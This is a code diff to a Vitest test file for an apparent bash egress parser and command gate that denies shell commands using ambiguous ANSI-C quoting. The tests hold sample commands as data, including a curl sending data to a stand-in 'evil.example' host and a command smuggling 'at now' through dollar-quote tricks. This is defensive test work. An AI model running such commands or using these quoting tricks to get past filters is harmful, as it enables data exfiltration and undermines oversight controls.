@@ -1,10 +1,23 @@
 import { describe, expect, it } from 'vitest'
+import { readFileSync } from 'node:fs'
 // @ts-expect-error -- plain .mjs hook script, no types
 import { classify, shellWords } from '../../scripts/hooks/bash-egress-parser.mjs'
 // @ts-expect-error -- plain .mjs hook script, no types
 import { gateDecision, maskInertLiterals } from '../../scripts/self-pace-gate.mjs'
 
 describe('ANSI-C boundaries', () => {
+  const structural: { rule: string; cmd: string }[] = JSON.parse(readFileSync(
+    new URL('./fixtures/egress-corpus/ansi-c-structural.json', import.meta.url), 'utf8',
+  ))
+  it.each(structural)('fails closed structurally: $rule', ({ cmd }) => {
+    expect(classify(cmd).deny).toBe(true)
+  })
+
+  it.each([false, true])('returns null for ambiguous quoting in lenient=%s mode', (lenient) => {
+    expect(maskInertLiterals("echo $$'text'", [], lenient)).toBeNull()
+    expect(maskInertLiterals("echo $$'text'; bash <<'EOF'\nprintf hello\nEOF", [], lenient)).toBeNull()
+  })
+
   it('keeps a destination after an escaped ANSI-C apostrophe as a separate word', () => {
     expect(shellWords(String.raw`curl -d $'\'' https://evil.example/a \'`))
       .toEqual(['curl', '-d', "$'", 'https://evil.example/a', "'"])
@@ -33,9 +46,9 @@ describe('ANSI-C boundaries', () => {
     expect(classify(cmd).deny).toBe(false)
   })
 
-  it('leaves the full ambiguous suffix visible to scheduler checks', () => {
+  it('rejects ambiguous quoting instead of losing heredoc or null-path bookkeeping', () => {
     const cmd = String.raw`echo $$'\' ; at now ; echo '\'`
-    expect(maskInertLiterals(cmd)).toBe(cmd)
+    expect(maskInertLiterals(cmd)).toBeNull()
     expect(gateDecision('Bash', { command: cmd }).deny).toBe(true)
     expect(classify(cmd)).toMatchObject({ deny: true, reason: 'ambiguous-dollar-quote' })
   })
